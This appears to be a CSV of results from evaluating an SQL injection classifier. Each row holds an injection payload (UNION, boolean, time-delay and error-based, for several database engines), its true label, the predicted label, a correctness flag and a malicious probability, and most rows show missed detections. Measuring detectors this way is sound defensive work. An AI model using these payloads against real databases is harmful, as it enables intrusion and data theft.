Query,Label,predicted,correct,malicious_probability
"1%'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1,0,False,0.4860892375057301
-1280'   )    )    or 8571  =  8571--,1,0,False,0.28094170372013894
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",1,1,True,0.6321491992838488
"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,0,False,0.21840937919337836
"1%""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.5760984012952327
"-9003""   )    )    union all select 9721,9721--",1,0,False,0.29838094396461046
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,1,0,False,0.4173976407923269
-2483' where 1327  =  1327 union all select 1327#,1,0,False,0.11585482614147136
"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",1,0,False,0.0857108697911645
end and   (  'uxzv'  =  'uxzv,1,0,False,0.42228839698359344
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,0,False,0.20842994694798245
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",1,1,True,0.5536840801967103
"1  )   as nfgb where 2503  =  2503 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,0,False,0.15075704335819645
"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1,1,True,0.5258830057121767
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,False,0.46249223223767205
"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.6735429334285808
select sleep  (  5  )   and    (    (   'uyft'  =  'uyft,1,1,True,0.7618591765245659
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,1,0,False,0.0802228633155081
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",1,0,False,0.2585023359877801
"1""  )   and 4595  =  4595#",1,0,False,0.0484580389268152
1   )    )     )   order by 1--,1,1,True,0.8842778012199919
1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,1,0,False,0.1430283348331316
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1,0,False,0.030067037528552158
1 where 9361  =  9361 and 7478  =  9170--,1,0,False,0.08248857878411484
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,False,0.47141203042302443
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",1,1,True,0.74869010778867
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,1,0,False,0.2977128012674079
"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",1,0,False,0.3177963166142671
"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",1,0,False,0.05050295317047867
select   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  select 6047 from information_schema.character_sets  )   end  )  #,1,0,False,0.2859384808768782
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,0,False,0.02829687361580699
"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",1,0,False,0.21221422821248284
-6014'   )    )    or   (  9860  =  4848  )  *4848 and    (    (   'qtge'  =  'qtge,1,0,False,0.07188632880672803
select case when 4656  =  3716 then 1 else null end--,1,0,False,0.18315879775677454
"1"" where 8571  =  8571",1,0,False,0.016706105653874814
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",1,0,False,0.06869783223558515
end#,1,0,False,0.058903716995350845
1'   )    )    union all select null#,1,1,True,0.5186278321161469
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1,0,False,0.04641213539115153
"1   )    )    as llnm where 6510  =  6510 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.6152007071066701
"1""  )   union all select null,null,null,null,null,null,null,null--",1,0,False,0.40760692584899544
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rnyb'  =  'rnyb",1,1,True,0.7963975846220736
1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,True,0.8045237022829056
"1 where 6095  =  6095 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.5747776697454959
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,1,1,True,0.9125893391179293
1' where 9003  =  9003 waitfor delay '0:0:5'--,1,1,True,0.9166533420771809
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",1,0,False,0.12895653771932386
"1""  )   waitfor delay '0:0:5'--",1,1,True,0.9313537623293258
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps",1,0,False,0.2901633205951673
end and    (    (     (  'gqhc'  =  'gqhc,1,0,False,0.2900702830920041
1'   )    )    as wqhm where 9871  =  9871,1,0,False,0.18137774600138135
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""rvuz"" like ""rvuz",1,0,False,0.24745996764260053
-3458'  )   where 2053  =  2053 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,0,False,0.1882013374224873
select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,1,0,False,0.2293488626572876
"select sleep  (  5  )   and ""irxg""  =  ""irxg",1,0,False,0.4781648241471402
select case when 8514  =  3207 then 1 else null end--,1,0,False,0.1861019395570465
1   )    )    waitfor delay '0:0:5'--,1,1,True,0.9363275058663288
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",1,0,False,0.13393882039127286
"1""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,False,0.4437185585324495
if  (  8727  =  4039  )   select 8727 else drop function giql--,1,0,False,0.11114061943079752
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1,0,False,0.19673678983915394
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1,1,True,0.5271271672202823
"-6599""   )    )    union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1,0,False,0.13929481753251527
"1%'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1,1,True,0.5481041137466375
"-4025"" or 3038  =  3038",1,0,False,0.009976132759830107
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,0,False,0.11157392958997654
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",1,1,True,0.5217839513356111
1'  )   where 2227  =  2227,1,0,False,0.16262100783454161
"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,1,0,False,0.22453148400248987
1  )   order by 1--,1,1,True,0.9286709204928976
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",1,0,False,0.27841919670619414
"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",1,0,False,0.2593260733075647
"1%' and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.5573110210869954
"1 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.6840630380195608
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,False,0.3598559857696393
1'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,True,0.9429089546216204
"-1451%'  )   union all select 7666,7666,7666#",1,0,False,0.06802596962335479
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1,0,False,0.058819081979664116
"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",1,0,False,0.21144475261557633
"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""rkry"" like ""rkry",1,0,False,0.047115161790915516
"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1,0,False,0.03949418449539256
"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.6688914610401815
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,True,0.6072011326777746
-2817  )   where 1212  =  1212 or 3266  =  1102,1,0,False,0.01969261891065096
"iif  (  9229  =  4158,1,1/0  )  ",1,0,False,0.06278552661016369
"1,  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",1,0,False,0.47823642908950686
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",1,0,False,0.4537015143417397
1'   )    )    order by 1--,1,1,True,0.9732232550705833
-5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,0,False,0.13053320561707984
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1,0,False,0.4122867544915262
"1""   )    )    union all select null,null,null,null,null,null,null#",1,0,False,0.1650624293739495
select   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  select 2352 from information_schema.character_sets  )   end  )  #,1,0,False,0.2759974928158476
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'ichh' like 'ichh",1,0,False,0.39348898537151766
1' and 6621  =  4681--,1,1,True,0.7093432827844356
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'oofd'  =  'oofd,1,0,False,0.2845825286368978
"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.8152385370460359
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,0,False,0.37404704275323036
"1'  )   as uvxl where 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,0,False,0.28752470071167907
"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",1,0,False,0.2466846543598744
-3582  )   where 5873  =  5873 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,0,False,0.14958614471765552
"1'  )   as fyuh where 7608  =  7608 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,False,0.11344066475679598
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",1,0,False,0.07677332374910101
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,0,False,0.23490525548054936
-4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1,1,True,0.7948796144558754
"-9891"" union all select 7489#",1,0,False,0.04519118284961226
1%' union all select null#,1,0,False,0.4162098847578608
"-1707  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  7756  =  7756",1,0,False,0.03384623402597232
"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",1,0,False,0.04525474922783165
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",1,0,False,0.02325396950307278
"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0,False,0.43878916608229446
"-4381 or make_set  (  6118  =  3095,3095  )  # lkcr",1,0,False,0.13086093180175104
1' rlike   (  select   (  case when   (  5567  =  5586  )   then 1 else 0x28 end   )    )    and 'mmnb'  =  'mmnb,1,1,True,0.7110317573214493
"-1196""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""srlq""  =  ""srlq",1,0,False,0.04873499647543828
1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1,1,True,0.6489941734166617
"1""   )    )    union all select null,null,null#",1,0,False,0.1816095748413225
"1""  )   where 6065  =  6065 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,False,0.29538376061793786
"-4256'  )   where 9545  =  9545 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,False,0.17498004774803277
"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.756323588583535
"-7776'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ihof'  =  'ihof",1,0,False,0.18566524943562557
1'   )    )    and   (  5091  =  8681  )  *8681 and    (    (   'xevm'  =  'xevm,1,0,False,0.4869215139557392
"1%"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1,0,False,0.23363620293124793
"1%""   )    )     )   and 4595  =  4595#",1,0,False,0.06722226995900019
"-2102' where 3644  =  3644 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,False,0.17813056550081513
-7903 where 6699  =  6699 or 8571  =  8571--,1,0,False,0.06530879778340484
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1,0,False,0.22730073278543583
"-5066'   )    )    union all select 9689,9689,9689,9689#",1,0,False,0.0576920862561043
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.6558977653260325
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""vfoh""  =  ""vfoh",1,0,False,0.33237663196949496
1  )   as ztrb where 1052  =  1052 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,True,0.6280221525906015
"1%""   )    )     )   union all select null--",1,1,True,0.582289918125081
"1%'   )    )     )   union all select null,null,null,null,null#",1,0,False,0.286549203748303
"-4692%""   )    )    union all select 1781,1781#",1,0,False,0.12156241646984052
"1""  )   as xrsi where 9498  =  9498",1,0,False,0.06294352112927472
"1%""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,1,0,False,0.3967630168947193
"1'  )   as myxr where 6299  =  6299 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.5828256361871514
"1'  )   as yhgk where 9246  =  9246 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.6759031520804173
"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,False,0.2761759117438305
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  """,1,0,False,0.05256331685979532
1   )    )    as xcsm where 9231  =  9231,1,0,False,0.0633102345741959
"1""  )   as vdim where 1296  =  1296",1,0,False,0.08403229523994112
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,1,True,0.5644471259465125
"1'  )   as viex where 6242  =  6242 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,0,False,0.21739889372743712
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",1,1,True,0.5144624375192348
"1'+  (  select 'sqje' where 1634  =  1634 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1,0,False,0.237290851822347
"1'   )    )    as uncy where 8009  =  8009 union all select null,null,null,null,null,null,null,null,null#",1,0,False,0.2619415999979007
1'||  (  select 'avxz' from dual where 7815  =  7815,1,0,False,0.3605282827610684
1'||  (  select 'glyc' from dual where 4058  =  4058,1,0,False,0.30714404618877317
1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,1,0,False,0.3776484606186464
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.541034500741357
1'  )   as sjij where 8659  =  8659,1,0,False,0.1296055528425586
1' and 2908  =  8067--,1,0,False,0.4900259426955302
"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1,1,True,0.589727198090189
"1"" where 7371  =  7371 waitfor delay '0:0:5'--",1,1,True,0.753601490945714
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo",1,0,False,0.1627628757346309
"1%'   )    )    union all select null,null,null,null--",1,1,True,0.6162943093278472
1' in boolean mode  )   and 4457  =  3885#,1,0,False,0.13991336617181832
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  """,1,0,False,0.4846976162579239
"1"" where 7879  =  7879",1,0,False,0.012161118981456076
"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",1,0,False,0.08070238307397408
"1%""   )    )    union all select null,null--",1,1,True,0.5665661060601515
1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,True,0.9200565616708454
"1""   )    )    waitfor delay '0:0:5'--",1,1,True,0.9233730550331322
"1'  )   as nmzp where 3794  =  3794 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,False,0.4146050613203434
"1  )   where 1880  =  1880 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,0,False,0.1635257627372861
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,0,False,0.15848997808908674
if  (  8182  =  3225  )   select 8182 else drop function kpzk--,1,0,False,0.04922977775526932
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  8529  =  8529",1,0,False,0.4146293249780546
1  )   as xtgr where 1545  =  1545,1,0,False,0.13663051699725737
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.6931830524766247
"1""   )    )    as ikuz where 7385  =  7385",1,0,False,0.03602553650297787
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # twev,1,1,True,0.8762182044457273
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",1,0,False,0.0313872670531358
"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.7815255568750425
1'||  (  select 'czos' from dual where 6814  =  6814,1,0,False,0.31270026980829907
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'lzbn'  =  'lzbn,1,1,True,0.8123986752048991
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""sfbc""  =  ""sfbc",1,0,False,0.23484680383831844
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1,1,True,0.6824648945047984
